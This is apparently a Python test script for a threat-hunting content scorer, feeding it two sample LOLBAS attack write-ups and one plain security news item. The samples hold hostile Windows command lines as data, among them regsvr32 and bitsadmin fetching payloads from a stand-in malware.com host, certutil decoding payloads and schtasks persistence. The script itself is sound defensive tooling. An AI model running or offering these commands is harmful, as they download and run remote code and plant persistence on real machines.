#!/usr/bin/env python3
"""
Test script to demonstrate the enhanced threat hunting scoring mechanism with LOLBAS.
"""

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))

from src.utils.content import ThreatHuntingScorer

def test_threat_hunting_scoring_with_lolbas():
    """Test the threat hunting scoring with LOLBAS content."""
    
    # Sample 1: High-quality threat hunting content with LOLBAS
    sample1_title = "APT Group Uses Living Off the Land Techniques with Certutil.exe"
    sample1_content = """
    Security researchers have identified a sophisticated APT campaign that leverages 
    living off the land binaries (LOLBAS) to evade detection. The threat actors use 
    multiple legitimate Windows executables for malicious purposes.
    
    Attack chain:
    1. Initial access via phishing with malicious .lnk files
    2. Execution of rundll32.exe with malicious DLL payload
    3. Use of certutil.exe to decode base64 encoded payloads
    4. Lateral movement using wmic.exe and schtasks.exe
    5. Persistence via regsvr32.exe with malicious COM objects
    
    Technical indicators:
    - Certutil.exe: /decode /f payload.b64 payload.exe
    - Wmic.exe: process call create "cmd.exe /c powershell.exe -enc ..."
    - Schtasks.exe: /create /tn "Update" /tr "C:\\temp\\malware.exe"
    - Regsvr32.exe: /s /u /i:http://malware.com/payload.sct scrobj.dll
    
    Registry modifications:
    - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Update
    - Value: "C:\\Windows\\System32\\rundll32.exe" "C:\\temp\\malware.dll,Start"
    
    File indicators:
    - %APPDATA%\\temp\\payload.b64
    - %TEMP%\\malware.exe
    - C:\\Windows\\System32\\malware.dll
    """
    
    # Sample 2: LOLBAS-focused malware analysis
    sample2_title = "Ransomware Campaign Leverages Multiple LOLBAS Tools"
    sample2_content = """
    A new ransomware campaign has been observed using various living off the land 
    binaries to execute its payload and maintain persistence.
    
    LOLBAS tools used:
    - Bitsadmin.exe: Download additional payloads
    - Certutil.exe: Decode base64 encoded configurations
    - Cmd.exe: Execute commands and scripts
    - Cscript.exe: Execute VBS scripts for persistence
    - Explorer.exe: Launch malicious executables
    - Forfiles.exe: Execute commands on files matching patterns
    - Ftp.exe: Download additional tools
    - Gpscript.exe: Execute group policy scripts
    - Hh.exe: Execute HTML applications
    - Ieexec.exe: Execute .exe files from IE
    - Mshta.exe: Execute HTA files with embedded scripts
    - Msiexec.exe: Install malicious MSI packages
    - Netsh.exe: Configure network settings for C2 communication
    - Reg.exe: Modify registry for persistence
    - Regsvr32.exe: Execute malicious COM objects
    - Sc.exe: Create and manage services
    - Schtasks.exe: Create scheduled tasks for persistence
    - Wmic.exe: Execute commands remotely
    - Wscript.exe: Execute VBS and JS scripts
    
    Command examples:
    ```cmd
    bitsadmin.exe /transfer "Update" http://malware.com/payload.exe C:\\temp\\payload.exe
    certutil.exe -decode payload.b64 payload.exe
    forfiles.exe /p C:\\Windows\\System32 /m *.exe /c "cmd.exe /c powershell.exe -enc ..."
    regsvr32.exe /s /u /i:http://malware.com/payload.sct scrobj.dll
    schtasks.exe /create /tn "WindowsUpdate" /tr "C:\\temp\\malware.exe" /sc onlogon
    ```
    """
    
    # Sample 3: General security news (no LOLBAS)
    sample3_title = "Company Announces New Security Platform"
    sample3_content = """
    A leading cybersecurity company has announced the launch of their new 
    security platform designed to protect enterprises from various threats.
    
    The platform includes features such as:
    - Advanced threat detection
    - Real-time monitoring
    - Automated response capabilities
    - Machine learning algorithms
    
    "We're excited to help organizations improve their security posture," 
    said the company's CEO. "Our platform provides comprehensive protection
    against modern cyber threats."
    """
    
    samples = [
        ("LOLBAS Threat Hunting", sample1_title, sample1_content),
        ("LOLBAS Malware Analysis", sample2_title, sample2_content),
        ("General Security News", sample3_title, sample3_content)
    ]
    
    print("Enhanced Threat Hunting Scoring with LOLBAS")
    print("=" * 60)
    
    for name, title, content in samples:
        print(f"\n📄 {name}")
        print("-" * 40)
        
        result = ThreatHuntingScorer.score_threat_hunting_content(title, content)
        
        print(f"Threat Hunting Score: {result['threat_hunting_score']}/100")
        print(f"Technical Depth Score: {result['technical_depth_score']}/30")
        print(f"Keyword Density: {result['keyword_density']} per 1000 words")
        
        if result['perfect_keyword_matches']:
            print(f"Perfect Keywords: {', '.join(result['perfect_keyword_matches'])}")
        
        if result['good_keyword_matches']:
            print(f"Good Keywords: {', '.join(result['good_keyword_matches'])}")
        
        if result['lolbas_matches']:
            print(f"LOLBAS Executables: {', '.join(result['lolbas_matches'])}")
        
        # Score interpretation
        if result['threat_hunting_score'] >= 80:
            print("🎯 EXCELLENT - High-quality threat hunting content")
        elif result['threat_hunting_score'] >= 60:
            print("🟡 GOOD - Decent threat hunting content")
        elif result['threat_hunting_score'] >= 40:
            print("🟠 FAIR - Some threat hunting elements")
        else:
            print("🔴 POOR - Limited threat hunting value")

if __name__ == "__main__":
    test_threat_hunting_scoring_with_lolbas()
